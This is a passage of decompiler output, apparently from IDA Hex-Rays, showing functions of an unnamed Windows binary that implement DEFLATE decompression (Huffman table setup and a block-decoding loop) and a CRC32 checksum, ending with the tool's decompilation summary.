      *a1 = v4;
    }
    while ( v3 );
  }
  a1[2] = 0;
  *(_DWORD *)a1[4] += v1;
  return 0;
}

//----- (00401DD0) --------------------------------------------------------
int sub_401DD0()
{
  int i; // eax
  int v1; // edx
  int j; // eax
  int v3; // esi
  int k; // eax
  int v5; // edx
  int result; // eax
  int v7; // esi

  sub_401850((int)word_403420, (int)word_403140);
  dword_403120 = 0;
  for ( i = 0; i < 26; ++i )
    byte_403124[i] = (unsigned int)i >> 2;
  v1 = 3;
  for ( j = 0; j < 30; ++j )
  {
    v3 = 1 << *((_BYTE *)&dword_403120 + j);
    word_4033E0[j] = v1;
    v1 += v3;
  }
  word_403100 = 0;
  for ( k = 0; k < 28; ++k )
    byte_403102[k] = (unsigned int)k >> 1;
  v5 = 1;
  for ( result = 0; result < 30; ++result )
  {
    v7 = 1 << *((_BYTE *)&word_403100 + result);
    word_4033A0[result] = v5;
    v5 += v7;
  }
  byte_40313C = 0;
  word_403418 = 258;
  return result;
}
// 403100: using guessed type __int16 word_403100;
// 403120: using guessed type int dword_403120;
// 40313C: using guessed type char byte_40313C;
// 403418: using guessed type __int16 word_403418;

//----- (00401E90) --------------------------------------------------------
int __cdecl sub_401E90(int a1, _DWORD *a2, unsigned __int8 *a3)
{
  int v3; // ecx
  unsigned int v4; // eax
  int v5; // esi
  int v6; // eax
  int v7; // eax
  int v8; // eax
  unsigned __int8 *v10; // [esp+8h] [ebp-4D4h] BYREF
  unsigned int v11; // [esp+Ch] [ebp-4D0h]
  int v12; // [esp+10h] [ebp-4CCh]
  int v13; // [esp+14h] [ebp-4C8h]
  _DWORD *v14; // [esp+18h] [ebp-4C4h]
  unsigned __int16 v15[304]; // [esp+1Ch] [ebp-4C0h] BYREF
  unsigned __int16 v16[304]; // [esp+27Ch] [ebp-260h] BYREF

  v10 = a3;
  v3 = 0;
  v13 = a1;
  v14 = a2;
  *a2 = 0;
  while ( 1 )
  {
    v12 = v3 - 1;
    if ( v3 )
    {
      v4 = v11;
    }
    else
    {
      v4 = *v10++;
      v12 = 7;
    }
    v5 = v4 & 1;
    v11 = v4 >> 1;
    v6 = sub_4019D0((int *)&v10, 2, 0);
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( v7 )
      {
        if ( v7 != 1 )
          return -3;
        sub_401AB0((int *)&v10, v15, v16);
        v8 = sub_401C90((int)&v10, v16, v15);
      }
      else
      {
        v8 = sub_401C90((int)&v10, word_403140, word_403420);
      }
    }
    else
    {
      v8 = sub_401D60((int *)&v10);
    }
    if ( v8 )
      return -3;
    if ( v5 )
      break;
    v3 = v12;
  }
  return 0;
}

//----- (00401F90) --------------------------------------------------------
int __cdecl sub_401F90(int a1, unsigned int a2)
{
  int v2; // eax
  unsigned int i; // ecx
  unsigned int v5; // eax

  v2 = -1;
  if ( !a2 )
    return 0;
  for ( i = 0; i < a2; ++i )
  {
    v5 = dword_402130[(*(_BYTE *)(i + a1) ^ (unsigned __int8)v2) & 0xF] ^ ((*(unsigned __int8 *)(i + a1) ^ (unsigned int)v2) >> 4);
    v2 = dword_402130[v5 & 0xF] ^ (v5 >> 4);
  }
  return ~v2;
}
// 401FA2: conditional instruction was optimized away because of '%arg_4.4!=0'

// nfuncs=31 queued=31 decompiled=31 lumina nreq=0 worse=0 better=0
// ALL OK, 31 function(s) have been successfully decompiled
